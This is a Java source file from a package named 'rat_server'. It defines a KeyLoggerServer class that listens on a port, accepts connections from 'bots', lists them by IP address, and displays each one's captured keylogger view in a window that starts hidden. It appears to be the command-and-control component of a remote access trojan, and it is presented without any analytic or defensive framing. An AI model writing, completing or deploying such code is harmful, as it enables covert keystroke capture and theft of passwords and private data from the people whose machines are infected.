package rat_server;

import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.net.ServerSocket;
import java.util.ArrayList;
import javax.swing.DefaultListModel;
import javax.swing.JFrame;
import javax.swing.JList;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

public class KeyLoggerServer extends JFrame
{
    private ServerSocket serverSocket;
    private JList<String> jList;
    private DefaultListModel<String> dlm;
    private ArrayList<KeyLoggerManager> bots;
    private JPanel keyLoggerView;
    
    public KeyLoggerServer(final int port)
    {
        setTitle("KeyLogger Server");
        setSize(1000,700);
        addWindowListener(new WindowAdapter()
        {
            @Override
            public void windowClosing(WindowEvent e) {
                setVisible(false);
            }  
        });
        setLayout(new GridLayout(1,2,100,40));
        keyLoggerView=new JPanel();
        keyLoggerView.setLayout(new FlowLayout());
        bots=new ArrayList();
        dlm=new DefaultListModel();
        jList=new JList(dlm);
        jList.setPreferredSize(new Dimension(200,100));
        jList.addListSelectionListener(new ListSelectionListener() {

            @Override
            public void valueChanged(ListSelectionEvent e)
            {
              if(!e.getValueIsAdjusting())
              {
                    keyLoggerView.removeAll();
                    keyLoggerView.add(bots.get(jList.getSelectedIndex()));
                    revalidate();
              }
            }
        });
        add(jList);
        add(keyLoggerView);
        setVisible(false);
        new Thread(new Runnable() {

            @Override
            public void run() {
                 try
                 {
                    serverSocket=new ServerSocket(port);
                    while(!serverSocket.isClosed())
                    {
                        bots.add(new KeyLoggerManager(serverSocket.accept()));
                        dlm.addElement(bots.get(bots.size()-1).getSocket().getInetAddress().getHostAddress());
                    }
                }
                catch(IOException exc)
                {
            
                }
            }
        }).start();
    }
    
    ArrayList<KeyLoggerManager> getKeyLoggersBot()
    {
        return bots;
    }
}
